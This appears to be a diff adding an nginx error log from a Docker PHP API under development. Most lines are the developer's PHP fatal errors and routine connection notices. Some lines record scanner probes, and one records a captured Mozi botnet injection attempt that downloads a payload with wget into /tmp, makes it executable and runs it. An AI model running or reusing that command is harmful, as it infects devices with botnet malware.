+  thrown in /docker/home/flutter_api/list.php on line 17" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:29:14 [error] 24#24: *151 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:29:17 [error] 24#24: *151 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:29:17 [error] 24#24: *151 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 08:29:32 [error] 24#24: *151 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 09:26:12 [info] 24#24: *167 client 104.206.128.22 closed keepalive connection
+2021/06/11 09:34:50 [info] 24#24: *169 client 216.218.206.69 closed keepalive connection
+2021/06/11 09:47:11 [info] 24#24: *171 client 185.117.2.115 closed keepalive connection
+2021/06/11 09:47:11 [info] 24#24: *173 client 185.117.2.115 closed keepalive connection
+2021/06/11 10:11:36 [info] 24#24: *175 client 3.81.144.160 closed keepalive connection
+2021/06/11 10:24:04 [info] 24#24: *177 client sent invalid method while reading client request line, client: 80.82.70.228, server: _, request: "o kRH≈#˜:Nﬂ‚¥Ç/ˇ	Tüßƒy∞h∆å§="·ò Ñ¥,ÖØn„Yªbhlˇ(=':©ÇŸo»¢◊ìò¥ÔÄÂπê (¿"
+2021/06/11 10:24:43 [info] 24#24: *180 client sent invalid method while reading client request line, client: 5.8.10.202, server: _, request: " ∫  ∂Ã8DÇ˘E]Ã|«S+p˝N		$”»‰aæ–î¸} vHÊE%qª4ll9&]dÔ◊ =ºMÂïãY¸5é<  Ã®Ã©¿/¿0¿+¿,¿¿	¿¿"
+2021/06/11 10:24:44 [info] 24#24: *183 client sent invalid method while reading client request line, client: 5.8.10.202, server: _, request: " ∫  ∂d™¢/0≠YDé;™˛‰„¶ΩF1xãpÛÍÑ≈qöi ã¬ÀÄe!|M´ Ï….Ìj•áNÿdHú‘ò0Àté  Ã®Ã©¿/¿0¿+¿,¿¿	¿¿"
+2021/06/11 10:24:53 [info] 24#24: *178 client 5.8.10.202 closed keepalive connection
+2021/06/11 10:24:54 [info] 24#24: *186 client sent invalid method while reading client request line, client: 5.8.10.202, server: _, request: " ∫  ∂Crõg∫%ÛæƒïÃﬂõIü«û›∂‡‡¸mò4 €E>ÅøÄLå°,‚R©„bôgñ·R6è“ˆüYSÎøo  Ã®Ã©¿/¿0¿+¿,¿¿	¿¿"
+2021/06/11 10:24:55 [info] 24#24: *189 client sent invalid method while reading client request line, client: 5.8.10.202, server: _, request: " ∫  ∂ÑÃÁW+•Cf≤ª„& ífá¬©[´÷⁄j”%s˛ ·9¿w*πäF*‰<8ûÁ∫È$»;—:>ˆ·º»ÈB  Ã®Ã©¿/¿0¿+¿,¿¿	¿¿"
+2021/06/11 10:25:00 [info] 24#24: *195 client 168.119.212.143 closed keepalive connection
+2021/06/11 10:25:00 [info] 24#24: *194 client closed connection while waiting for request, client: 89.248.171.23, server: 0.0.0.0:80
+2021/06/11 10:25:00 [info] 24#24: *192 client 89.248.171.23 closed keepalive connection
+2021/06/11 10:29:16 [error] 24#24: *197 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Object of class mysqli_stmt could not be converted to string in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 10:29:27 [error] 24#24: *200 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Object of class mysqli_stmt could not be converted to string in /docker/home/flutter_api/list.php:18
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 18" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 10:29:38 [info] 24#24: *200 client 172.20.0.1 closed keepalive connection
+2021/06/11 10:30:16 [info] 24#24: *198 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 10:35:31 [info] 24#24: *202 client sent invalid method while reading client request line, client: 41.251.116.173, server: _, request: "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0"
+2021/06/11 10:36:32 [info] 24#24: *204 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 10:36:38 [info] 24#24: *219 client 172.20.0.1 closed keepalive connection
+2021/06/11 10:37:47 [error] 24#24: *221 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Object of class mysqli_result could not be converted to string in /docker/home/flutter_api/list.php:22
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 22" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 10:38:47 [info] 24#24: *223 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 10:45:53 [error] 24#24: *224 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Object of class mysqli_result could not be converted to string in /docker/home/flutter_api/list.php:24
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 24" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 10:46:53 [info] 24#24: *225 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 11:16:39 [info] 24#24: *227 client closed connection while waiting for request, client: 193.142.203.227, server: 0.0.0.0:80
+2021/06/11 11:16:40 [info] 24#24: *228 client 193.142.203.227 closed keepalive connection
+2021/06/11 11:16:40 [info] 24#24: *230 client 193.142.203.227 closed keepalive connection
+2021/06/11 11:19:49 [info] 24#24: *232 client 172.245.158.3 closed keepalive connection
+2021/06/11 11:19:50 [info] 24#24: *234 client 172.245.158.3 closed keepalive connection
+2021/06/11 11:34:10 [info] 24#24: *236 client closed connection while waiting for request, client: 73.121.217.247, server: 0.0.0.0:80
+2021/06/11 11:34:10 [info] 24#24: *237 client 73.121.217.247 closed keepalive connection (104: Connection reset by peer)
+2021/06/11 11:35:11 [info] 24#24: *239 client 159.89.150.250 closed keepalive connection
+2021/06/11 12:26:46 [info] 24#24: *243 client 98.103.171.36 closed keepalive connection
+2021/06/11 12:41:58 [info] 24#24: *249 client 193.118.53.210 closed keepalive connection
+2021/06/11 12:43:12 [info] 24#24: *251 client 185.53.90.20 closed keepalive connection
+2021/06/11 12:47:47 [error] 24#24: *253 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined variable $conn in /docker/home/flutter_api/list.php on line 46PHP message: PHP Fatal error:  Uncaught Error: Call to a member function close() on null in /docker/home/flutter_api/list.php:46
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 46" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 12:47:59 [error] 24#24: *253 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined variable $conn in /docker/home/flutter_api/list.php on line 46PHP message: PHP Fatal error:  Uncaught Error: Call to a member function close() on null in /docker/home/flutter_api/list.php:46
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 46" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 12:48:05 [error] 24#24: *253 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined variable $conn in /docker/home/flutter_api/list.php on line 46PHP message: PHP Fatal error:  Uncaught Error: Call to a member function close() on null in /docker/home/flutter_api/list.php:46
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 46" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 12:48:20 [error] 24#24: *253 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined variable $conn in /docker/home/flutter_api/list.php on line 46PHP message: PHP Fatal error:  Uncaught Error: Call to a member function close() on null in /docker/home/flutter_api/list.php:46
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 46" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 12:48:47 [info] 24#24: *254 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 12:50:21 [info] 24#24: *269 client 172.20.0.1 closed keepalive connection
+2021/06/11 12:50:49 [info] 24#24: *266 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 12:51:12 [info] 24#24: *271 client 172.20.0.1 closed keepalive connection
+2021/06/11 12:51:31 [info] 24#24: *273 client 172.20.0.1 closed keepalive connection
+2021/06/11 12:52:12 [info] 24#24: *275 client 172.20.0.1 closed keepalive connection
+2021/06/11 12:57:33 [info] 24#24: *285 client 172.20.0.1 closed keepalive connection
+2021/06/11 12:57:39 [info] 24#24: *278 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 12:58:47 [info] 24#24: *290 client 172.20.0.1 closed keepalive connection
+2021/06/11 12:59:16 [info] 24#24: *287 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 13:05:04 [info] 24#24: *292 client 83.41.123.192 closed keepalive connection
